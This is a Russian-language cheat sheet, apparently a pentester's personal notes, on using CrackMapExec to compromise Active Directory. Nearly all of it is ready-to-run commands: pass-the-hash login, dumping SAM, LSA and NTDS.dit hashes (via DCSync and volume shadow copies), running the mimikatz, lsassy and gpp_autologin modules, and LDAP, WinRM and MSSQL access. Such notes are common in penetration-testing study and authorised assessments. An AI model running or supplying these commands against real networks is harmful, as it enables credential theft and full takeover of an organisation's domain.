		#tool #windows #framework #AD #multy

CME - это фреймворк для управления компрометацией AD
CME позволяет работать сразу с множеством модулей и протоколов
 > Использует поученные данные и говорит, что сейчас уже можно сделать
 
### Модули внутренние

1) SMB
2) LDAP
3) MSSQL
4) WinRM
5) Действие с учетными данными

### Эксплуатация

#### 1) Проверка учетной записи
```bash
crackmapexec smb <ip> -u <user> -p <password>
```

#### 2) Pass-the-Hash
```bash
crackmapexec smb <ip> -u <user> -H <NTLM-хэш>
```

#### 3) **Credential Dumping**

##### **SAM**
- Работает на любой локальной машине, но с правами локального админа
- Применяет `shadow copy` и `SAMR`
- Использует доступ по `RPC`
- Дампит креды локальных учеток
```bash
crackmapexec smb <ip> -u <user> -p <password> --sam
```

##### LSA
- Работает на любой локальной машине, но с правами локального админа
- Использует доступ к ветки реестра за счет прав админа
```bash
crackmapexec smb <ip> -u <user> -p <password> --lsa
```

##### NTDS
- Компрометация всей AD
- Работает только на AD
- Эксплуатирует `DCSync` (Вызывает `DRSGetNCChanges`и получает хэши основного DC)
- Эксплуатирует `Shadow Copy` (Создаёт `Vol Shadow Copy` и копирует `NTDS.dit` `SYSTEM`)
```bash
crackmapexec smb <ip> -u <user> -p <password> --ntds
```

#### 4) Использование модулей

- **Mimikatz**
```bash
crackmapexec smb <ip> -u <user> -p <password> -M mimikatz
```
- **LSASS**
```bash
crackmapexec smb <ip> -u <user> -p <password> -M lsassy
```
- **gpp_autologin**
```bash
crackmapexec smb <ip> -u <user> -p <password> -M gpp_autologin
```

#### 5) LDAP Recon
```bash
crackmapexec ldap <dc_ip> -u <user> -p <pass> --groups --users --computers
```

#### 6) WinRM (Если SMB закрыт)
```bash
crackmapexec winrm <ip> -u <user> -p <password>
```

#### 7) MSSQL
```bash
crackmapexec mssql <ip> -u <user> -p <password>
```

